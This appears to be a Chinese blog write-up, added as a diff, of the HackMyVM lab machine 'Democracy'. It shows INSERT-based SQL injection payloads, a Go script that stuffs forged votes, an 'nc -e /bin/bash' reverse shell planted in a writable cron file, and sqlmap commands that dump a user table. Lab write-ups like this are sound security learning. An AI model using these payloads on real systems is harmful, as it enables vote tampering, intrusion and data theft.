@@ -1,0 +1,325 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>hackmyvm-Democracy · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-09-18">2025年9月18日</time>
+        
+        
+          <span class="post__readtime">8 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/hackmyvm/">#hackmyvm</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">hackmyvm-Democracy</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>写在最前:</p>
+<p>这个靶机没有提权的地方</p>
+<p>但是这个靶机的SQL注入点是我之前从来没见过的。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Democracy">靶机: Democracy</a></p>
+<p><a target="_blank" rel="noopener" href="https://mega.nz/file/bgdiFY4R#uZHbegcF8UK9RVP9Ia-4S-UbIULnhaL9d8mYgo8HkVY">下载页面</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机发现</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181901248.png" alt="image-20250918190137156"></p>
+<p><code>192.168.56.157</code>即为目标ip</p>
+<p>端口扫描</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181902344.png" alt="image-20250918190214280"></p>
+<p>只开放了<code>22</code>与<code>80</code>两个端口</p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181903654.png" alt="image-20250918190355316"></p>
+<p>大致是一个投票系统</p>
+<p>为<code>共和党</code>与<code>民主党</code>候选人投票</p>
+<p>点击去投票就会跳转到登录页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181908068.png" alt="image-20250918190816820"></p>
+<p>如果没有账户可以注册一个</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181908555.png" alt="image-20250918190836323"></p>
+<p>登录与注册页面进行测试没有发现SQL注入漏洞</p>
+<p>登录进去之后</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181909488.png" alt="image-20250918190923330"></p>
+<p>有三个功能 分别是 <code>投票</code>, <code>查看结果</code>, <code>重置投票</code></p>
+<p>每个账户只能投票一次</p>
+<p>点击重置投票之后 投票信息就会清零 重新进行投票</p>
+<blockquote>
+<p>坑点</p>
+<p>每当你成功投票一次的时候</p>
+<p>下次再去测试投票功能点的时候就要先进行一次<code>重置投票</code>操作</p>
+<p>不然这无法得到想要的回显</p>
+</blockquote>
+<p>対这三个功能点抓个包</p>
+<p><code>投票</code>数据包, 以POST方式传递了一个数据</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181914477.png" alt="image-20250918191458319"></p>
+<p>在传递的数据后面加一个单引号<code>&#39;</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181918255.png" alt="image-20250918191855200"></p>
+<p>报错了。</p>
+<p>加俩单引号<code>&#39;</code>就成功投票,且没有报错</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181919887.png" alt="image-20250918191919791"></p>
+<p>但是当在后面加上<code>&#39; -- a</code>的时候</p>
+<p>页面仍然报错。 </p>
+<p>按道理来说<code>-- </code>将后面的独立引号给闭合掉了。不应该会有报错了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181921570.png" alt="image-20250918192137502"></p>
+<p>在后面用<code>&#39;)--+a&#39;</code>又没报错了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181922564.png" alt="image-20250918192259493"></p>
+<p>所以数据闭合方式是<code>&#39;)</code></p>
+<p>在后面用<code>&#39;) or 1=1 -- a</code>来测试是报错</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181925268.png" alt="image-20250918192511203"></p>
+<p>报错给了GPT问了一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181929319.png" alt="image-20250918192913264"></p>
+<p>他给了我举一个<code>insert</code>语法的例子</p>
+<p>突然间反映过来了</p>
+<p>它的计票方式有可能是<code>insert table (候选人,票数) values (&lt;候选人&gt;,1)</code>类似这种方式存储票数</p>
+<p>所以我就构造了一个这样子的payload<code>democrat&#39;,10000)--+1&#39;</code> 企图直接投10000票</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181932890.png" alt="image-20250918193243801"></p>
+<p>不过他又给报错</p>
+<p>这次的报错显示的是列数不一样</p>
+<p>那他可能就是类似这样的形式<code>insert table (票数,候选人) values (1,&lt;候选人&gt;)</code>票数在前</p>
+<p>那么就无法直接修改票数了</p>
+<p>我然后我又试了这样一个payload<code>democrat&#39;),(100000,&#39;democrat&#39;);+--+1</code></p>
+<p>这样执行的时候 我是想着数据库中数据会不会编程</p>
+<table>
+<thead>
+<tr>
+<th>ticket num</th>
+<th>name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>democrat</td>
+</tr>
+<tr>
+<td>100000</td>
+<td>democrat</td>
+</tr>
+</tbody></table>
+<p>等到下一次查询的时候 说不定它会查到第二条数据。</p>
+<p>我这样做的想法是想要看看能不能让第二条数据覆盖第一条数据</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181936244.png" alt="image-20250918193627182"></p>
+<p>然后我去查了一下票数</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181937483.png" alt="image-20250918193716419"></p>
+<p>这时候票数显示的是2</p>
+<p>我也没有用第二个账户去投票。也只投了一次 这里竟然是两票。</p>
+<p>所以当时就再现他统计票数的方法可能是<code>select count(*) from table where 候选人=某某某</code></p>
+<p>为了验证我的想法</p>
+<p>我将payload修改成<code>democrat&#39;),(100000,&#39;democrat&#39;),(100000,&#39;republican&#39;);+--+1</code>之后又投了一次。</p>
+<p>预期的结果应该是 democrat 2票 republican1票</p>
+<p>结果正如预期那般</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181940650.png" alt="image-20250918194029588"></p>
+<p>再回到网站首页</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181941121.png" alt="image-20250918194114910"></p>
+<p>民主党候选人是支持开放共享数字数据和FTP服务器</p>
+<p>获取让它胜出会有不一样的变化</p>
+<p>同样也说明了获胜的条件。就是获得1000票</p>
+<p>所以就用刚才那个方法 给民主党人投1000票看看</p>
+<p>这里是我写的一个脚本</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	values := url.Values&#123;&#125;</span><br><span class="line">	values.Set(<span class="string">&quot;candidate&quot;</span>, <span class="string">&quot;democrat&#x27;),&quot;</span>+strings.Repeat(<span class="string">&quot;(100000,&#x27;democrat&#x27;),&quot;</span>, <span class="number">999</span>)+<span class="string">&quot;(1,&#x27;democrat&#x27;); -- 1&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;democrat&#x27;),&quot;</span> + strings.Repeat(<span class="string">&quot;(100000,&#x27;democrat&#x27;),&quot;</span>, <span class="number">999</span>) + <span class="string">&quot;(1,&#x27;democrat&#x27;); -- 1&quot;</span>)</span><br><span class="line">	request, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://192.168.56.156/vote.php&quot;</span>, strings.NewReader(values.Encode()))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> request.Body.Close()</span><br><span class="line">	request.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">	request.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=t1af4rtk9t92n6hf29qs5jhlui&quot;</span>)</span><br><span class="line">	response, err := http.DefaultClient.Do(request)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> response.Body.Close()</span><br><span class="line">	fmt.Println(<span class="string">&quot;response Status:&quot;</span>, response.Status)</span><br><span class="line">	all, _ := io.ReadAll(response.Body)</span><br><span class="line">	fmt.Println(<span class="string">&quot;response Body:&quot;</span>, <span class="type">string</span>(all))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用脚本进行一次投票</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181944227.png" alt="image-20250918194420154"></p>
+<p>再来查询票数Democrat的票数就变成了1001</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181944576.png" alt="image-20250918194449501"></p>
+<p>再返回网站页面 点击查看票数按钮就会跳转</p>
+<p>开启系统页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181945491.png" alt="image-20250918194541245"></p>
+<p>或许这个过程就是在开启竞选宣言中的ftp服务</p>
+<p>在对其进行一次端口扫描</p>
+<p>这个时候就会发现多开了一个21ftp端口</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181946620.png" alt="image-20250918194658493"></p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>lftp连接上去<code>lftp 192.168.56.157</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181948264.png" alt="image-20250918194808209"></p>
+<p>只有一个votes文件</p>
+<p>并且我们对它有所有权限</p>
+<p>拿下来看一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181949753.png" alt="image-20250918194901645"></p>
+<p>是一个定时任务脚本。</p>
+<p>同样里面的sql语句也正好印证了 对票数统计系统的逻辑猜想</p>
+<p>既然对votes有所有权限</p>
+<p>那么在他下面加上一个反弹shell的语句就行了</p>
+<p>将它原本的<code>nc -e /bin/bash 192.168.0.29 4444</code>反弹shell语句 改成我们自己的ip与端口然后再上传上去就行了</p>
+<p>传上去之后 监听我们自己的端口就行了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181952234.png" alt="image-20250918195214137"></p>
+<p>但是他这个弹上来之后就是root权限。。。。</p>
+<h2 id="其他人sql解法"><a href="#其他人sql解法" class="headerlink" title="其他人sql解法"></a>其他人sql解法</h2><p>在做完之后我又去看了一眼其他人的解法</p>
+<p>他们大多人的做法是</p>
+<p>使用sqlmap在注入点将数据注出来。 不过在这个过程中需要一直访问<code>重置票数</code>接口</p>
+<p>将数据包拿出来放到一个sql.txt中</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509181956468.png" alt="image-20250918195637368"></p>
+<p>另开一个终端执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">while true; do \</span><br><span class="line">  curl -sS -X POST &#x27;http://192.168.56.157/vote.php&#x27; \</span><br><span class="line">    -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span><br><span class="line">    -b &#x27;PHPSESSID=6h1bqhf7cj5gg1bl05pjvp19kr&#x27; \</span><br><span class="line">    --data &#x27;reset=1&#x27; --compressed; \</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>不断访问重置密码接口</p>
+<p>然后另一个终端执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -r sql.txt --batch --dbs </span><br></pre></td></tr></table></figure>
+
+<p>跑库名</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509182002993.png" alt="image-20250918200228885"></p>
+<p>跑表名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -r sql.txt --batch -D voting --tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509182003852.png" alt="image-20250918200312747"></p>
+<p>跑数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -r sql.txt --batch -D voting -T users --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509182004969.png" alt="image-20250918200436834"></p>
+<p>用户表中有1k多个用户</p>
+<p>全部拿下来之后</p>
+<p>批量使用这些账号去投票</p>
+<p>这种方法稍麻烦些。</p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-04-04">2025·04·04</time>
+          <a class="related__link" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/">hackmyvm-Principle</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-03-18">2025·03·18</time>
+          <a class="related__link" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/">hackmyvm-Espo</a>
+        </li>
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-03-15">2025·03·15</time>
+          <a class="related__link" href="/2025/03/15/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-HackingToys/">hackmyvm-HackingToys</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&%20Perimeter%20Leak/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
